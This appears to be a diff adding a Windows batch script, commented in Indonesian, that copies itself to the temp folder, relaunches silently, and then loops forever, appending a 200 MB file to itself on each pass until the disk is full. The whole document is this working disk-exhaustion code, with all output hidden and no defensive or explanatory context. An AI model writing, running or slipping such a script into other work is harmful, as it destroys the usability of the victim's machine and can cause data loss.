@@ -1,0 +1,23 @@
+@echo off
+setlocal enabledelayedexpansion
+
+rem === Ukuran tambah per putaran = 200 MB ===
+set "TAMBAH_UKURAN=209715200"
+
+rem === Cek apakah ini salinan yang berjalan di temp ===
+if /i not "%~dp0"=="%temp%\" (
+    rem === Buat salinan ke folder temp agar tidak terkunci ===
+    copy /y "%~f0" "%temp%\proses_besar.bat" >nul 2>&1
+    rem === Jalankan salinannya, lalu hentikan yang asli ===
+    start "" "%temp%\proses_besar.bat"
+    exit /b
+)
+
+:ULANG
+rem === Di sini kita gunakan berkas di temp, jadi bebas diubah ===
+fsutil file createnew "%temp%\data_200mb.tmp" %TAMBAH_UKURAN% >nul 2>&1
+copy /b "%~f0" + "%temp%\data_200mb.tmp" "%temp%\file_baru.tmp" >nul 2>&1
+move /y "%temp%\file_baru.tmp" "%~f0" >nul 2>&1
+del /f /q "%temp%\data_200mb.tmp" >nul 2>&1
+
+goto ULANG
